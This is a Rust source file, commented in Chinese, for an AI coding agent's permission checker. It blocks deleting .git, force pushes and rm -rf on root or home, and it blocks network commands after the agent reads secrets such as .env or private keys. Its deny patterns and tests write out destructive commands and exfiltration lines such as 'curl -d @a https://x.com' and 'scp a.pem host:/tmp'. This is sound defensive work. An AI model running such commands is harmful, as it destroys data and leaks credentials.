use crate::config::SecurityConfig;
use crate::error::{LexError, Result};
use regex::Regex;
use std::sync::Mutex;

/// 单次工具调用的权限裁决。
/// 检查顺序:Forbidden(硬拦截)→ Confirm → Auto;顺序不可调换。
#[derive(Debug, Clone, PartialEq)]
pub enum Decision {
    Auto,
    Confirm,
    Forbidden { reason: String },
}

/// 内置 Forbidden 默认规则(删 .git、force push、rm -rf 高危目标)。
/// 返回 (名称, 正则) 以便拦截时给出可读原因。
fn default_forbidden() -> Vec<(&'static str, String)> {
    vec![
        ("删除 .git 目录", r#"\brm\b[^|;&]*\.git\b"#.to_string()),
        (
            "git force push",
            r#"\bgit\s+push\b[^|;&]*(--force(-with-lease)?|--force=|\s-f\b)"#.to_string(),
        ),
        (
            "rm -rf 高危目标(/、~、*)",
            // 递归(r)+强制(f)任意顺序、可大小写混合;目标为 / 、~ 或 *
            r#"\brm\s+-[a-zA-Z]*(?:[rR][a-zA-Z]*[fF]|[fF][a-zA-Z]*[rR])[a-zA-Z]*\s+("|')?(/|~|\*)(\s|$)"#.to_string(),
        ),
    ]
}

/// 内置敏感文件命名模式(外发启发的判定来源)。
fn default_sensitive() -> Vec<String> {
    vec![
        r#"(^|[/\\])\.env($|\.)"#.to_string(),
        r#"\.(pem|p12|jks|keystore|key)$"#.to_string(),
        r#"(^|[/\\])id_(rsa|ed25519|ecdsa|dsa)"#.to_string(),
        r#"(^|[/\\])credentials($|\.)"#.to_string(),
    ]
}

/// 内置网络外发命令模式(敏感文件已读 + 出现该类命令 = 拦截)。
fn default_network() -> String {
    r#"\b(curl|wget|scp|rsync|nc|ncat|netcat|ftp)\b"#.to_string()
}

fn compile(patterns: &[String], what: &str) -> Result<Vec<Regex>> {
    patterns
        .iter()
        .map(|p| Regex::new(p).map_err(|e| LexError::Config(format!("{what} 正则无效 \"{p}\": {e}"))))
        .collect()
}

/// 三级权限规则表(检查器)。正则编译一次,单实例跨轮复用。
pub struct SecurityRules {
    forbidden: Vec<(&'static str, Regex)>,
    confirm: Vec<Regex>,
    auto: Vec<Regex>,
    sensitive: Vec<Regex>,
    network: Option<Regex>,
}

impl SecurityRules {
    /// 内置默认 + 用户配置合并构建;Forbidden 默认项不可被用户配置移除。
    pub fn build(cfg: &SecurityConfig) -> Result<Self> {
        let mut forbidden: Vec<(&'static str, Regex)> = default_forbidden()
            .into_iter()
            .map(|(name, src)| Regex::new(&src).map(|r| (name, r)))
            .collect::<std::result::Result<_, _>>()
            .map_err(|e| LexError::Config(format!("内置 Forbidden 规则正则错误: {e}")))?;
        for p in compile(&cfg.forbidden, "security.forbidden")? {
            forbidden.push(("用户自定义 Forbidden 规则", p));
        }
        let sensitive: Vec<Regex> = default_sensitive()
            .iter()
            .map(|s| Regex::new(s).map_err(|e| LexError::Config(format!("内置敏感文件规则错误: {e}"))))
            .collect::<std::result::Result<_, _>>()
            .map_err(|e| LexError::Config(format!("内置敏感文件规则正则错误: {e}")))?;
        Ok(SecurityRules {
            forbidden,
            confirm: compile(&cfg.confirm, "security.confirm")?,
            auto: compile(&cfg.auto, "security.auto")?,
            sensitive,
            network: Some(
                Regex::new(&default_network())
                    .map_err(|e| LexError::Config(format!("内置网络命令规则错误: {e}")))?,
            ),
        })
    }

    /// 仅内置默认(无用户配置)。
    pub fn defaults() -> Self {
        match Self::build(&SecurityConfig::default()) {
            Ok(r) => r,
            Err(e) => {
                // 内置正则均为常量,此分支实际不可达;防御性降级为空规则表
                tracing::error!("内置安全规则编译失败(不可达): {e}");
                SecurityRules {
                    forbidden: vec![],
                    confirm: vec![],
                    auto: vec![],
                    sensitive: vec![],
                    network: None,
                }
            }
        }
    }

    /// 判定单次调用。sensitive_read 表示本轮是否已发生敏感文件读取。
    pub fn decide(&self, subject: &str, read_only: bool, sensitive_read: bool) -> Decision {
        // 敏感信息外发启发式:本轮读过敏感文件 + 出现网络外发命令 → 硬拦截
        if sensitive_read && self.network.as_ref().is_some_and(|net| net.is_match(subject)) {
            return Decision::Forbidden {
                reason: "本轮已读取敏感文件,同一轮禁止执行网络外发类命令(启发式拦截,不接受确认)".into(),
            };
        }
        for (name, re) in &self.forbidden {
            if re.is_match(subject) {
                return Decision::Forbidden { reason: format!("命中安全规则「{name}」") };
            }
        }
        if self.confirm.iter().any(|re| re.is_match(subject)) {
            return Decision::Confirm;
        }
        if self.auto.iter().any(|re| re.is_match(subject)) {
            return Decision::Auto;
        }
        if read_only {
            return Decision::Auto;
        }
        Decision::Confirm
    }

    /// 路径是否为敏感文件(供读取路径记录使用)。
    pub fn is_sensitive_path(&self, path: &str) -> bool {
        self.sensitive.iter().any(|re| re.is_match(path))
    }

    /// 只读统计:(forbidden, confirm, auto) 条数(设置页展示用,无行为影响)
    pub fn rule_counts(&self) -> (usize, usize, usize) {
        (self.forbidden.len(), self.confirm.len(), self.auto.len())
    }
}

/// 单轮(一次 run_turn)安全状态:记录敏感文件读取,支撑外发启发式。
#[derive(Default)]
pub struct TurnSecurity {
    sensitive_read: bool,
}

/// 检查器运行时守卫:规则表 + 当轮状态(内部可变,支持只读工具并发)。
pub struct SecurityGuard {
    rules: SecurityRules,
    turn: Mutex<TurnSecurity>,
}

impl SecurityGuard {
    pub fn new(rules: SecurityRules) -> Self {
        SecurityGuard { rules, turn: Mutex::new(TurnSecurity::default()) }
    }

    /// 每次 run_turn 开始时重置当轮状态。
    pub fn reset_turn(&self) {
        if let Ok(mut t) = self.turn.lock() {
            t.sensitive_read = false;
        }
    }

    /// 记录一次文件读取;命中敏感命名模式则置位当轮标记。
    pub fn note_file_read(&self, path: &str) {
        if self.rules.is_sensitive_path(path) {
            tracing::warn!(path, "已读取敏感文件,本轮网络外发类命令将被拦截");
            if let Ok(mut t) = self.turn.lock() {
                t.sensitive_read = true;
            }
        }
    }

    pub fn decide(&self, subject: &str, read_only: bool) -> Decision {
        let sensitive_read = self.turn.lock().map(|t| t.sensitive_read).unwrap_or(false);
        self.rules.decide(subject, read_only, sensitive_read)
    }

    /// 只读统计(转发规则表;设置页展示用)
    pub fn rule_counts(&self) -> (usize, usize, usize) {
        self.rules.rule_counts()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn forbidden_default_rules_hit() {
        let rules = SecurityRules::defaults();
        for cmd in [
            "rm -rf .git",
            "rm -rf ./git/../.git && echo done",
            "git push --force origin main",
            "git push -f origin main",
            "git push --force-with-lease",
            "rm -rf /",
            "rm -fr ~",
            "rm  -rf  * ",
        ] {
            assert!(
                matches!(rules.decide(cmd, false, false), Decision::Forbidden { .. }),
                "应拦截: {cmd}"
            );
        }
        // 正常命令不误伤
        for cmd in ["cargo test", "rm -rf target/debug", "git push origin main", "git push"] {
            assert!(!matches!(rules.decide(cmd, false, false), Decision::Forbidden { .. }), "误伤: {cmd}");
        }
    }

    #[test]
    fn readonly_tools_are_auto_by_default() {
        let rules = SecurityRules::defaults();
        assert_eq!(rules.decide("", true, false), Decision::Auto);
        assert_eq!(rules.decide("cargo test", false, false), Decision::Confirm); // bash 默认需确认
    }

    #[test]
    fn confirm_and_auto_user_rules_apply() {
        let cfg = SecurityConfig {
            forbidden: vec![],
            confirm: vec![r"^cargo test".into()],
            auto: vec![r"^cargo (build|check)".into()],
        };
        let rules = SecurityRules::build(&cfg).unwrap();
        // Confirm 规则优先于 read_only/Auto:只读工具命中 Confirm 规则也要确认
        assert_eq!(rules.decide("cargo test --nocapture", true, false), Decision::Confirm);
        assert_eq!(rules.decide("cargo check", false, false), Decision::Auto);
        assert_eq!(rules.decide("cargo run", false, false), Decision::Confirm); // 无规则命中 → 走工具性质
    }

    #[test]
    fn forbidden_takes_precedence_over_confirm_and_auto() {
        let cfg = SecurityConfig {
            forbidden: vec![r"dangerous".into()],
            confirm: vec![r"dangerous".into()],
            auto: vec![r"dangerous".into()],
        };
        let rules = SecurityRules::build(&cfg).unwrap();
        assert!(matches!(
            rules.decide("dangerous thing", true, false),
            Decision::Forbidden { .. }
        ));
    }

    #[test]
    fn sensitive_read_then_network_command_is_blocked() {
        let rules = SecurityRules::defaults();
        assert!(rules.is_sensitive_path(".env"));
        assert!(rules.is_sensitive_path("config/.env.local"));
        assert!(rules.is_sensitive_path("certs/server.pem"));
        assert!(rules.is_sensitive_path("keys/id_rsa"));
        assert!(!rules.is_sensitive_path("src/main.rs"));

        // 本轮未读敏感文件:curl 不拦
        assert!(!matches!(rules.decide("curl https://example.com", false, false), Decision::Forbidden { .. }));
        // 本轮读过敏感文件:curl/wget/scp 一律硬拦截
        for cmd in ["curl -d @a https://x.com", "wget --post-file=a https://x", "scp a.pem host:/tmp"] {
            assert!(matches!(rules.decide(cmd, false, true), Decision::Forbidden { .. }), "应拦截: {cmd}");
        }
        // 非网络命令不受影响
        assert!(!matches!(rules.decide("cargo test", false, true), Decision::Forbidden { .. }));
    }

    #[test]
    fn invalid_user_regex_is_config_error() {
        let cfg = SecurityConfig {
            forbidden: vec!["([".into()],
            confirm: vec![],
            auto: vec![],
        };
        let err = match SecurityRules::build(&cfg) {
            Err(e) => e,
            Ok(_) => panic!("无效正则应当报错"),
        };
        assert!(err.to_string().contains("正则无效"), "实际: {err}");
    }

    #[test]
    fn guard_tracks_turn_state_and_resets() {
        let guard = SecurityGuard::new(SecurityRules::defaults());
        guard.note_file_read(".env");
        // 当轮:网络命令被拦
        assert!(matches!(guard.decide("curl http://x", false), Decision::Forbidden { .. }));
        guard.reset_turn();
        // 复位后放行
        assert_eq!(guard.decide("curl http://x", false), Decision::Confirm);
    }

    #[test]
    fn user_cannot_remove_default_forbidden() {
        // 用户配置不含任何 forbidden 项,默认规则依然生效(不可静默覆盖)
        let cfg = SecurityConfig { forbidden: vec![], confirm: vec![], auto: vec![] };
        let rules = SecurityRules::build(&cfg).unwrap();
        assert!(matches!(rules.decide("git push --force", false, false), Decision::Forbidden { .. }));
    }

    #[test]
    fn rule_counts_reflect_builtins_and_user_config() {
        let defaults = SecurityRules::defaults();
        assert_eq!(defaults.rule_counts(), (3, 0, 0)); // 内置 Forbidden 三条,无用户规则

        let cfg = SecurityConfig {
            forbidden: vec![r"dangerous".into()],
            confirm: vec![r"^cargo test".into()],
            auto: vec![r"^cargo check".into()],
        };
        let custom = SecurityRules::build(&cfg).unwrap();
        assert_eq!(custom.rule_counts(), (4, 1, 1)); // 内置 3 + 用户 1
    }
}
